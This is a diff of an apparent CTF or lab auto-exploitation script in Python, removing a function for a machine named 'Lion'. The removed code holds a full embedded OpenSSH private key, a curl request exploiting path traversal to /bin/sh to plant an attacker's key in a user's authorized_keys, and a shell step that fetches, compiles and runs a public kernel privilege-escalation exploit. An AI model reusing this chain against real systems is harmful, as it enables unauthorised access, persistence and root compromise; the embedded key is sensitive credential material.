@@ -4,7 +4,6 @@ import os
 import ftplib
 import re
 
-# machineName = input("Enter Machine Name: ")
 sess = requests.session()
 usage = f"Usage: {sys.argv[0]} <Machine Name> <Machine Ip>"
 
@@ -113,58 +112,6 @@ def Fortune():
     time.sleep(1)
     shell.interactive()
 
-def Lion():
-    global ip, sess
-    id_rsa = """-----BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-NhAAAAAwEAAQAAAYEAqb6llsuP5pWHWVR3+9i7SG428TVzDEtGVR6vcm/k7hg34MlDyrZB
-HOuIJ6Afgk4+i95Cke4f+ovRY94B4Hk6kElAV4EQt7h5BJ5ogqqtSCCYEOSZlHdLZWXQ4s
-68ef1Qj9YfAXZ5/dpWaCNEepIPj3IVehlkEerw/EEM+6uoMNZp7ZWhzVAQHmYdlIFoq7Y+
-jHWbqBfitWEOleWGKTaYDY9SQX4HsbXgyroWc7op191CiRWj1UeDqD8SfYVYgziqCR4D2G
-XuyymaQtIWz2RMOHQfMudqZp45LxigTUK9vOACrKy2Ht5YRkfbVYM8e4ucwK3/JLhxVRzj
-iAwfNehquyKZ2aa6xKpaIsPkKSQHZ7ftunW7kYsAjq1chfwwKQN6CcAuJVJ3Ho+vTh7WIz
-eFCfDufQHMVRP/71o/ct8Fs0aHEMaG01x1Ll7TZecuPOcU0Av+qMWwn2wJIVeQ+mBudXXn
-+ydP1LZgajIIse9YztbL5ORf9V6xm1PAgwXAxQqpAAAFgITM17eEzNe3AAAAB3NzaC1yc2
-EAAAGBAKm+pZbLj+aVh1lUd/vYu0huNvE1cwxLRlUer3Jv5O4YN+DJQ8q2QRzriCegH4JO
-PoveQpHuH/qL0WPeAeB5OpBJQFeBELe4eQSeaIKqrUggmBDkmZR3S2Vl0OLOvHn9UI/WHw
-F2ef3aVmgjRHqSD49yFXoZZBHq8PxBDPurqDDWae2Voc1QEB5mHZSBaKu2Pox1m6gX4rVh
-DpXlhik2mA2PUkF+B7G14Mq6FnO6KdfdQokVo9VHg6g/En2FWIM4qgkeA9hl7sspmkLSFs
-9kTDh0HzLnamaeOS8YoE1CvbzgAqysth7eWEZH21WDPHuLnMCt/yS4cVUc44gMHzXoarsi
-mdmmusSqWiLD5CkkB2e37bp1u5GLAI6tXIX8MCkDegnALiVSdx6Pr04e1iM3hQnw7n0BzF
-UT/+9aP3LfBbNGhxDGhtNcdS5e02XnLjznFNAL/qjFsJ9sCSFXkPpgbnV15/snT9S2YGoy
-CLHvWM7Wy+TkX/VesZtTwIMFwMUKqQAAAAMBAAEAAAGAAIqpUlt8rnCOdaJjfiAdS+A/KG
-KiZvkEBNBD4M562WgmIH9f6iEOAOK/BNpZ02N+x1k6lubevwDMdqA+Gwpj/ZMgQ483v5BV
-AYbkYDtdcXAaMB6cn1jImq6aHakpeI2ugMD/CRUI016rnSo0pRv7dPqZFzJGy5hXc8Sc3x
-43e41pmd6a/THa1U//2uoVTIv4s9/Jsv39hRTl1CRe+tlv34Y0Ld2SNnbVPGxe1zhyOvw7
-or6ZDtyLLuGhpFklNMj835SX9VGNTwnjnryS7aXsTbX7Gdq9uAXORIyICDhnTcLPwLRvL0
-FTs/VrODDWgNsaifOyChnHQnL11kXmGzdpB5WrelnTc8wB5KqzhuPt1fb7bXeu6WIOqS+m
-9xwgAf2vALtsS7qB2+oM1uLY23b5qnjWhsNKOEIS6MJNavhXoMexTB0seVkmWfKbn4oTq9
-GWmDnvUT6l5prTFncnvXaNRDx6kJKI9VobDTu0OEQVRcjs1J8Q6yFc8tQl14XXvgCBAAAA
-wFdd1wFBux3a9lBBLyqNjGmJ3ZDlGMxTRo3QbF+KUT1bW9N7/VMz5+ymbO7UVzSSU+TlPN
-ePV+iClCH6fHxH3OQuPQ3fNDWGbJ2kkZOcKs1mgplzsug03pgeSGISsfF8rUeWLzk/W9pb
-gqaWCKw2+mu8KVOrUJxjltrObAP269YxJMFRAmfty6lsFhhFIzcz3PQoqm3uedsREnTSNU
-XRuAnzeW0Js1EHHoPCGIbGKjzgGPyzwjWPHXo81WMIua1z5QAAAMEAw+zv5m1nr1OjZhwa
-1UoMYvjRYb3JJRFrJ6WUSY7l1RP+BODuP2vn1Id4MHDZJwklECegjGrzYwAAIzkW6Bom/1
-BxN3zRHuXxN1FcGpml6ttfX32ygUNlStpsLitDW4U1KgK93V6XEK2/3VZDSQuJ+kSpny1a
-rgMuVLSHhGShzqKaORSpyXm1EAKkOQiyt5mJSsH1S+DJ8uVfgqIIfCkeotrDH11tnciO+F
-Pmz8N7E5xETpiBypLM6Ue/wJUtp1KBAAAAwQDdyqk+7TOaSvtzp9uSO1xI0MP+9JiEY5fi
-qi/4w5Mm2jtqgzt51B3FTbYZhnHIXd83DB5FSJ0JQWpgZ3R/+boF8ZqbXWoviH/3HTdNyo
-ZXmEndW6U24OCXJE/2/3OfgaSdHVjWMeS9qLOwNf1uMVRV51YIvzIXU/EtcGeRvIbwB8Bl
-4mpmnc0BfU1yGDgDr0bjqmKBggamvdHQmgtVALWIjQD9VKI8+KW5x4sLRMLPCDLCCH2tlr
-MJJkQvUOGm1CkAAAAHeTBAbmFtZQECAwQ=
------END OPENSSH PRIVATE KEY-----"""
-    myKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpvqWWy4/mlYdZVHf72LtIbjbxNXMMS0ZVHq9yb+TuGDfgyUPKtkEc64gnoB+CTj6L3kKR7h/6i9Fj3gHgeTqQSUBXgRC3uHkEnmiCqq1IIJgQ5JmUd0tlZdDizrx5/VCP1h8Bdnn92lZoI0R6kg+PchV6GWQR6vD8QQz7q6gw1mntlaHNUBAeZh2UgWirtj6MdZuoF+K1YQ6V5YYpNpgNj1JBfgexteDKuhZzuinX3UKJFaPVR4OoPxJ9hViDOKoJHgPYZe7LKZpC0hbPZEw4dB8y52pmnjkvGKBNQr284AKsrLYe3lhGR9tVgzx7i5zArf8kuHFVHOOIDB816Gq7IpnZprrEqloiw+QpJAdnt+26dbuRiwCOrVyF/DApA3oJwC4lUncej69OHtYjN4UJ8O59AcxVE//vWj9y3wWzRocQxobTXHUuXtNl5y485xTQC/6oxbCfbAkhV5D6YG51def7J0/UtmBqMgix71jO1svk5F/1XrGbU8CDBcDFCqk= y0@name"
-    os.system(f"curl -s -X POST 'http://{ip}:8080/.%0d./.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c \"mkdir /home/gloria/.ssh; echo '{myKey}' > /home/gloria/.ssh/authorized_keys\"'")
-    file = open('key', 'w')
-    file.write(id_rsa)
-    file.close()
-    req = ssh(host=ip, user="gloria", keyfile='key')
-    shell = req.process("/bin/sh")
-    time.sleep(1)
-    shell.sendline("wget https://github.com/rlarabee/exploits/blob/master/cve-2017-16995/cve-2017-16995.c; gcc --static cve-2017-16995.c -o cve; ./cve")
-    time.sleep(2)
-    shell.interactive()
-
 if __name__ == "__main__":
     if len(sys.argv) < 3 :
         print(usage)
@@ -181,12 +128,8 @@ if __name__ == "__main__":
             Panda()
         if machineName == "H1" or machineName == "h1":
             H1()
-        if machineName == "Carnage" or machineName == "carnage":
-            Carnage()
         if machineName == "Fortune" or machineName == "fortune":
             Fortune()
-        if machineName == "Lion" or machineName == "lion":
-            Lion()
         else:
             print("[!] Invalid Machine Name")
             exit()
